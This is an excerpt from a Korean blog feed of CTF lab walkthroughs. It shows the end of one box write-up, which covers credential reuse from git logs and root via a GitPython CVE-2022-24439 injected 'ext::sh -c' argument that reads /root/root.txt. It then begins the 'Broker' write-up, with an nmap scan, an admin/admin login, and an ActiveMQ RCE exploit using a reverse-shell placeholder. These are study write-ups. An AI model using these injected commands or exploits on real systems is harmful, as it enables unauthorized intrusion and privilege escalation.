&lt;h2 id=&quot;초입&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B4%88%EC%9E%85&quot; aria-label=&quot;초입 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;초입&lt;/h2&gt;
&lt;p&gt;얻은 로그인 자격증명을 이용해 SSH에 연결해보자.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/e9265bde-e6c4-4931-8437-6ca01f2ca296/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;측면-이동-Lateral-Movement&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B8%A1%EB%A9%B4-%EC%9D%B4%EB%8F%99-Lateral-Movement&quot; aria-label=&quot;측면 이동 Lateral Movement permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;측면 이동 (Lateral Movement)&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;~/apps&lt;/code&gt; 에 깃(git)이 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/54649a1e-bf6a-483a-b6a9-a916deb0989e/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/788c8a3f-16d3-4664-9861-ed8b7d8b549f/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;~/apps/.git/logs&lt;/code&gt; 에서 하이라이트된 부분을 아래의 명령어를 이용해 자세히 살펴보자. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그러면 아래와 같은 탬플렛 메일 메세지 &lt;code class=&quot;language-text&quot;&gt;template_mail_message&lt;/code&gt; 내용을 볼 수 있고, 이전과 같이 새로운 로그인 자격증명을 얻을 수 있다. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;유저네임: &lt;code class=&quot;language-text&quot;&gt;prod&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;비밀번호: &lt;code class=&quot;language-text&quot;&gt;080217_Producti0n_2023!@&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/87696c9a-acce-4d0b-8747-8639d7ba44c0/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;새로 얻은 로그인 자격증명을 이용해 SSH에 연결하자. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/db395340-5adc-4aa7-9a8c-a999255c9d1a/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;권한-상승-Privilege-Escalation&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9-Privilege-Escalation&quot; aria-label=&quot;권한 상승 Privilege Escalation permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;권한 상승 (Privilege Escalation)&lt;/h2&gt;
&lt;p&gt;슈퍼유저로 실행할 수 있는 권한을 확인하기 위해 &lt;code class=&quot;language-text&quot;&gt;sudo -l&lt;/code&gt; 를 살펴보면&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/98018cdc-2259-4e1c-8297-02d39f4fd425/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/opt/internal_apps/clone_changes/clone_prod_change.py *&lt;/code&gt; 파이썬 파일을 권한 상승없이 실행 시킬 수 있다는 것을 확인할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/e05aaac8-1689-405e-b57f-655b19f5cd5b/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;여기서 중요한 부분은 아래와 같다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; git &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Repo&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 스크립트가 GitPython 라이브러리를 활용하여 Git 작업을 수행한다는 것을 알 수 있는 대목이기 때문에 이 스크립트에서 가장 유용한 정보라고 할 수 있다. &lt;/p&gt;
&lt;p&gt;구글에 &lt;code class=&quot;language-text&quot;&gt;from git import Repo&lt;/code&gt; 의 취약점을 검색하면 &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2022-24439&quot;&gt;CVE-2022-24439&lt;/a&gt;에 관한 내용을 찾아볼 수 있고 이를 악용해 권한 상승을 할 수 있다. &lt;/p&gt;
&lt;p&gt;나는 &lt;a href=&quot;https://github.com/gitpython-developers/GitPython/issues/1515&quot;&gt;https://github.com/gitpython-developers/GitPython/issues/1515&lt;/a&gt; 여기와 여기 &lt;a href=&quot;https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858&quot;&gt;https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858&lt;/a&gt; 를 참고했다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &lt;span class=&quot;token string&quot;&gt;&apos;ext::sh -c cat% /root/root.txt% &gt;% /tmp/root&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/1e3ee081-6a2c-4fd1-b7d1-ed60143190c5/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;이렇게 &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt;와 함께 상위 명령어를 입력하면 하면 루트로 권한 상승을 할 수 있다. &lt;/p&gt;</content:encoded></item><item><title><![CDATA[Broker]]></title><description><![CDATA[Broker 요약  Broker는 Apache ActiveMQ를 호스팅하는 쉬운 난이도의 리눅스 머신이다. 
'Apache ActiveMQ' 버전을 찾아보면 원격 코드 실행 (Unauthenticated Remote Code Execution…]]></description><link>https://h3llanut3lla.github.io/Broker/</link><guid isPermaLink="false">https://h3llanut3lla.github.io/Broker/</guid><pubDate>Fri, 07 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;Broker-요약&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Broker-%EC%9A%94%EC%95%BD&quot; aria-label=&quot;Broker 요약 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Broker 요약&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/68b13905-0b9c-4d3a-aff0-d787acc4723c/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Broker는 Apache ActiveMQ를 호스팅하는 쉬운 난이도의 리눅스 머신이다.
&apos;Apache ActiveMQ&apos; 버전을 찾아보면 원격 코드 실행 (Unauthenticated Remote Code Execution)에 취약하다는 것을 알 수 있으며 이를 악용해서 타겟 시스템 초입을 할 수 있다. 이후, 권한상승을 위한 정보를 얻다보면 잘못된 sudo 구성을 찾을 수 있고, &lt;code class=&quot;language-text&quot;&gt;sudo /usr/sbin/nginx&lt;/code&gt; 를 통해 가장 높은 권한인 root 권한을 얻을 수 있다. 이 방식은 &apos;Zimbra&apos; 취약점 디스클로져와 비슷하다.&lt;/p&gt;
&lt;h2 id=&quot;정보-수집&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%B3%B4-%EC%88%98%EC%A7%91&quot; aria-label=&quot;정보 수집 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;정보 수집&lt;/h2&gt;
&lt;h3 id=&quot;Nmap-포트-스캔&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Nmap-%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%94&quot; aria-label=&quot;Nmap 포트 스캔 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Nmap 포트 스캔&lt;/h3&gt;
&lt;p&gt;TCP 스캔내용&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;└─$ nmap &lt;span class=&quot;token parameter variable&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10.10&lt;/span&gt;.11.243                 
Starting Nmap &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;.94SVN &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; at &lt;span class=&quot;token number&quot;&gt;2024&lt;/span&gt;-07-01 &lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;:33 AEST
Nmap scan report &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10.10&lt;/span&gt;.11.243
Host is up &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;.016s latency&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&quot;token number&quot;&gt;998&lt;/span&gt; closed tcp ports &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE VERSION
&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt;     OpenSSH &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;.9p1 Ubuntu 3ubuntu0.4 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; protocol &lt;span class=&quot;token number&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_  &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  http    nginx &lt;span class=&quot;token number&quot;&gt;1.18&lt;/span&gt;.0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; http-auth: 
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class=&quot;token number&quot;&gt;401&lt;/span&gt; Unauthorized&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;x0D
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_  basic &lt;span class=&quot;token assign-left variable&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;ActiveMQRealm
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-title: Error &lt;span class=&quot;token number&quot;&gt;401&lt;/span&gt; Unauthorized
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-server-header: nginx/1.18.0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;HTTP 포트가 열려 있으니 우선 들어가보자. &lt;/p&gt;
&lt;h3 id=&quot;80-HTTP&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#80-HTTP&quot; aria-label=&quot;80 HTTP permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;80-HTTP&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/38604c0c-c362-4cd4-a2df-e10dfecc5f58/image.png&quot;&gt;
여기에 디폴트 유저네임 &lt;code class=&quot;language-text&quot;&gt;admin&lt;/code&gt; 비밀번호 &lt;code class=&quot;language-text&quot;&gt;admin&lt;/code&gt; 으로 로그인하면 아래와 같이 정확한 버전정보를 확인할 수 있다. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Version 5.15.15
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/74d467cb-1171-416a-a42d-ceaafee12d08/image.png&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;초입&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B4%88%EC%9E%85&quot; aria-label=&quot;초입 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;초입&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ActiveMQ 5.15.15 github&lt;/code&gt; 혹은 &lt;code class=&quot;language-text&quot;&gt;ActiveMQ 5.15.15 exploits&lt;/code&gt; 라고 구글에 검색해보면 여러 엑스플로이트들이 나오는데, 나는 그 중 &lt;a href=&quot;https://github.com/X1r0z/ActiveMQ-RCE/tree/main&quot;&gt;https://github.com/X1r0z/ActiveMQ-RCE/tree/main&lt;/a&gt; 이걸 사용했다. &lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;poc.xml&lt;/code&gt; 파일에 리버스쉘을 넣어주면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;xml&quot;&gt;&lt;pre class=&quot;language-xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;list&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;여기에 리버스 쉘 입력&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;list&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;수정된 &lt;code class=&quot;language-text&quot;&gt;poc.xml&lt;/code&gt;
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/491ee409-7cd0-45a2-a996-9f2fac982eea/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;그렇다면 이렇게 타겟에 쉘이 생긴것을 확인할 수 있다 (우측 상단).
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/7673de1b-d013-4bbd-986d-66d1b431be92/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;권한-상승&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9&quot; aria-label=&quot;권한 상승 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;권한 상승&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; 로 사용 가능한 명령어를 확인하기 위해 &lt;code class=&quot;language-text&quot;&gt;sudo -l&lt;/code&gt; 이라고 쳐보면 &lt;code class=&quot;language-text&quot;&gt;/usr/sbin/nginx&lt;/code&gt; 가 권한 상승 없이 쓸 수 있는것을 확인할 수 있다.&lt;br&gt;
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/2f6ed5c9-2163-4c51-bfe9-a3f6e1f88b19/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;nginx&lt;/code&gt; 헬프 페이지를 보면 친절하게도 아래와 같이 버전정보를 확인할 수 있다.
&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/d40d38a9-a20a-4327-9f97-8ec02b03b47f/image.png&quot;&gt;&lt;/p&gt;
